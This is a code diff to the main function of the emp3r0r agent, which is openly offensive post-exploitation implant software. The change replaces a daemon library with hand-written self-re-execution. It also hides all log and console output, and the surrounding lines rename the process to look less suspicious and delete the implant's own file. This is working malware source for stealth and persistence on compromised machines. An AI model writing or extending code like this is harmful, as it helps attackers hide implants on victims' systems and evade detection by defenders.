@@ -11,6 +11,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"os/user"
 	"path/filepath"
 	"strings"
@@ -23,7 +24,6 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
 	"github.com/ncruces/go-dns"
-	"github.com/sevlyar/go-daemon"
 	"src.elv.sh/pkg/buildinfo"
 	"src.elv.sh/pkg/lsp"
 	"src.elv.sh/pkg/prog"
@@ -38,6 +38,7 @@ func main() {
 	verbose := flag.Bool("verbose", false, "Enable logging")
 	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
+	runElvsh := os.Getenv("ELVSH") == "TRUE"
 
 	// -replace specified in environment variable
 	if os.Getenv("REPLACE_AGENT") != "" {
@@ -51,8 +52,39 @@ func main() {
 		return
 	}
 
-	// silent switch
-	log.SetOutput(ioutil.Discard)
+	if !runElvsh {
+		// always daemonize unless verbose is specified
+		run_as_daemon := !*verbose &&
+			// don't daemonize if we're already daemonized
+			os.Getenv("DAEMON") != "true"
+
+		if run_as_daemon {
+			os.Setenv("DAEMON", "true") // mark as daemonized
+			cmd := exec.Command(os.Args[0])
+			err = cmd.Start()
+			if err != nil {
+				log.Fatalf("Daemonize: %v", err)
+			}
+			os.Exit(0)
+		}
+
+		// verbose or not
+		if *verbose {
+			log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
+			fmt.Println("emp3r0r agent has started")
+			log.SetOutput(os.Stderr)
+		} else {
+			// silent switch
+			log.SetOutput(ioutil.Discard)
+			null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0644)
+			if err != nil {
+				log.Fatalf("[-] Cannot open %s: %v", os.DevNull, err)
+			}
+			defer null_file.Close()
+			os.Stderr = null_file
+			os.Stdout = null_file
+		}
+	}
 
 	// rename our agent process to make it less suspecious
 	self_path, err := os.Readlink("/proc/self/exe")
@@ -65,34 +97,12 @@ func main() {
 		util.RandInt(0, 6)))
 
 	// run as elvish shell
-	runElvsh := os.Getenv("ELVSH") == "TRUE"
 	if runElvsh {
 		os.Exit(prog.Run(
 			[3]*os.File{os.Stdin, os.Stdout, os.Stderr}, osArgs,
 			prog.Composite(
 				&buildinfo.Program{}, &lsp.Program{},
 				&shell.Program{})))
-	}
-
-	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
-	if *verbose {
-		fmt.Println("emp3r0r agent has started")
-		log.SetOutput(os.Stderr)
-	} else {
-		// daemonize
-		cntxt := &daemon.Context{
-			PidFileName: agent.RuntimeConfig.PIDFile,
-			PidFilePerm: 0600,
-			Args:        os.Args,
-		}
-		d, err := cntxt.Reborn()
-		if err != nil {
-			log.Fatal("Unable to daemonize: ", err)
-		}
-		if d != nil {
-			return
-		}
-		defer cntxt.Release()
 	}
 
 	// self delete
